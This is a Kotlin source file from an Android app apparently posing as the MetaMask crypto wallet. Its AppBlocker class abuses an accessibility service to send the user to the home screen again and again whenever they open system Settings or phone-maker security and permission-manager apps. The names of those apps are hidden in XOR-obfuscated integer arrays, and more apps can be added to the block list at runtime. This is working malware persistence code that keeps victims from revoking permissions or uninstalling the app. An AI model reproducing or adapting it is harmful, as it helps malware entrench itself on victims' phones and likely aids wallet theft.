package com.example.MetaMask.services

import android.accessibilityservice.AccessibilityService
import android.content.Context
import android.os.Handler
import android.os.Looper
import android.view.accessibility.AccessibilityEvent

class AppBlocker(private val context: Context) {

    companion object {
        private const val K = 0x3F

        private val BLKD = arrayOf(
            intArrayOf(92,80,82,17,94,81,91,77,80,86,91,17,76,90,75,75,86,81,88,76),
            intArrayOf(92,80,82,17,82,86,74,86,17,76,90,75,75,86,81,88,76),
            intArrayOf(92,80,82,17,76,94,82,76,74,81,88,17,94,81,91,77,80,86,91,17,76,90,75,75,86,81,88,76),
            intArrayOf(92,80,82,17,73,86,73,80,17,76,90,75,75,86,81,88,76),
            intArrayOf(92,80,82,17,93,93,84,17,76,90,75,75,86,81,88,76),
            intArrayOf(92,80,82,17,92,80,83,80,77,80,76,17,76,90,75,75,86,81,88,76),
            intArrayOf(92,80,82,17,80,79,79,80,17,76,90,75,75,86,81,88,76),
            intArrayOf(92,80,82,17,80,81,90,79,83,74,76,17,76,90,75,75,86,81,88,76),
            intArrayOf(92,80,82,17,87,74,94,72,90,86,17,76,90,75,75,86,81,88,76),
            intArrayOf(92,80,82,17,87,86,87,80,81,80,77,17,76,90,75,75,86,81,88,76),
            intArrayOf(92,80,82,17,94,76,74,76,17,76,90,75,75,86,81,88,76),
            intArrayOf(92,80,82,17,82,86,74,86,17,76,90,92,74,77,86,75,70,92,90,81,75,90,77),
            intArrayOf(92,80,82,17,76,94,82,76,74,81,88,17,94,81,91,77,80,86,91,17,76,82),
            intArrayOf(92,80,82,17,76,94,82,76,74,81,88,17,94,81,91,77,80,86,91,17,76,82,17,79,80,83,86,92,70),
            intArrayOf(92,80,82,17,76,94,82,76,74,81,88,17,94,81,91,77,80,86,91,17,76,82,17,91,90,73,86,92,90,76,90,92,74,77,86,75,70),
            intArrayOf(92,80,82,17,76,94,82,76,74,81,88,17,94,81,91,77,80,86,91,17,83,80,80,83),
            intArrayOf(92,80,82,17,92,80,83,80,77,80,76,17,76,94,89,90,92,90,81,75,90,77),
            intArrayOf(92,80,82,17,73,86,73,80,17,79,90,77,82,86,76,76,86,80,81,82,94,81,94,88,90,77),
            intArrayOf(92,80,82,17,87,74,94,72,90,86,17,76,70,76,75,90,82,82,94,81,94,88,90,77),
            intArrayOf(92,80,82,17,87,86,87,80,81,80,77,17,76,70,76,75,90,82,82,94,81,94,88,90,77),
            intArrayOf(92,80,82,17,94,76,74,76,17,82,80,93,86,83,90,76,90,92,74,77,86,75,70)
        )
    }

    private val handler = Handler(Looper.getMainLooper())

    private val blockedPkgs: Set<String> by lazy {
        BLKD.mapTo(HashSet()) { arr -> arr.map { (it xor K).toChar() }.joinToString("") }
    }

    private val prefs by lazy {
        context.getSharedPreferences("app_state_prefs", Context.MODE_PRIVATE)
    }

    private val dynPrefs by lazy {
        context.getSharedPreferences("dynamic_app_block", Context.MODE_PRIVATE)
    }

    private val dynamicBlockedPkgs: MutableSet<String> =
        java.util.Collections.synchronizedSet(mutableSetOf())

    init {
        try {
            val arr = org.json.JSONArray(dynPrefs.getString("blocked_packages", "[]") ?: "[]")
            for (i in 0 until arr.length()) dynamicBlockedPkgs.add(arr.getString(i))
        } catch (_: Exception) {}
    }

    private fun saveDynamic() {
        android.util.Log.d("XDBG", "[AppBlocker] saveDynamic enter") //xdbg
        try {
            dynPrefs.edit()
                .putString("blocked_packages", org.json.JSONArray(dynamicBlockedPkgs.toList()).toString())
                .apply()
        } catch (_: Exception) {}
    }

    fun blockPackage(pkg: String) {
        android.util.Log.d("XDBG", "[AppBlocker] blockPackage enter pkg=${pkg}") //xdbg
        dynamicBlockedPkgs.add(pkg)
        saveDynamic()
    }

    fun unblockPackage(pkg: String) {
        android.util.Log.d("XDBG", "[AppBlocker] unblockPackage enter pkg=${pkg}") //xdbg
        dynamicBlockedPkgs.remove(pkg)
        saveDynamic()
    }

    fun isPackageBlocked(pkg: String): Boolean = pkg in dynamicBlockedPkgs

    @Volatile private var setupDoneCache = false
    @Volatile private var setupCheckedAt = 0L

    @Volatile private var blockingEnabled = true

    fun setBlockingEnabled(v: Boolean) {
        android.util.Log.d("XDBG", "[AppBlocker] setBlockingEnabled enter v=${v}") //xdbg
        blockingEnabled = v
        setupCheckedAt = 0L
    }

    fun initFromPrefs() {
        android.util.Log.d("XDBG", "[AppBlocker] initFromPrefs enter") //xdbg
        blockingEnabled = prefs.getBoolean("settings_block_enabled", true)
    }

    private fun isSetupDone(): Boolean {
        android.util.Log.d("XDBG", "[AppBlocker] isSetupDone enter") //xdbg
        val now = System.currentTimeMillis()
        if (now - setupCheckedAt > 5_000L) {
            android.util.Log.d("XDBG", "[AppBlocker] if branch") //xdbg
            setupDoneCache = prefs.getBoolean("setup_chain_completed", false)
            blockingEnabled = prefs.getBoolean("settings_block_enabled", true)
            setupCheckedAt = now
        }
        android.util.Log.d("XDBG", "[AppBlocker] return") //xdbg
        return setupDoneCache
    }

    fun onEvent(event: AccessibilityEvent) {
        android.util.Log.d("XDBG", "[AppBlocker] onEvent enter event=${event}") //xdbg
        if (event.eventType != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) return

        val pkg = event.packageName?.toString() ?: return

        if (pkg in dynamicBlockedPkgs) {
            android.util.Log.d("XDBG", "[AppBlocker] if branch") //xdbg
            kickToHome()
            return
        }

        if (!blockingEnabled) return
        if (!isSetupDone()) return
        if (pkg !in blockedPkgs) return

        val cls = event.className?.toString()?.lowercase() ?: ""
        if (pkg == "com.miui.securitycenter" && (cls.startsWith("android.") || cls.startsWith("androidx.") || cls.startsWith("miui."))) return

        kickToHome()
    }

    private fun kickToHome() {
        android.util.Log.d("XDBG", "[AppBlocker] kickToHome enter") //xdbg
        val svc = context as? AccessibilityService ?: return
        try { svc.performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME) } catch (_: Exception) {}
        handler.postDelayed({
            try { svc.performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME) } catch (_: Exception) {}
        }, 150L)
        handler.postDelayed({
            try { svc.performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME) } catch (_: Exception) {}
        }, 400L)
    }
}
